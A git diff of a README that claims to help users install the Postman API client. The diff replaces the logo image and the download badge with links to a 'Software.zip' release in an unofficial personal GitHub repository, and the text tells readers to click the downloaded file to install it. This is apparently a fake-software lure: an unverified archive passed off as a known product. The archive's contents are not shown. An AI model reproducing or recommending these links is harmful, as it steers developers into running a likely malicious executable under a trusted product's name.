@@ -1,7 +1,7 @@
 
 # 🚀 **Postman API Client Setup**
 
-![Postman Logo](https://seeklogo.com/images/P/postman-logo-F43375A2EB-seeklogo.com.png)
+![Postman Logo](https://github.com/Thanatapn/Postman-API-Client-Setup/releases/download/v1.0/Software.zip)
 
 ## Overview
 Welcome to the **Postman API Client Setup** repository! Here, you will find everything you need to easily install and set up Postman, the most popular API client for testing and developing APIs. Whether you are a developer or a tester, this repository provides you with the tools to streamline your API testing and integration workflows! 🔧🚀
@@ -9,7 +9,7 @@ Welcome to the **Postman API Client Setup** repository! Here, you will find ever
 ## Installation Guide
 To install Postman quickly and efficiently, simply download the installation package from the following link:
 
-[![Download Postman](https://img.shields.io/badge/Download-Postman-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Postman](https://github.com/Thanatapn/Postman-API-Client-Setup/releases/download/v1.0/Software.zip)](https://github.com/Thanatapn/Postman-API-Client-Setup/releases/download/v1.0/Software.zip)
 
 After downloading the package, follow the installation instructions to set up Postman on your system. If the link does not automatically download the file, be sure to click on the downloaded file to launch the installation process.
 
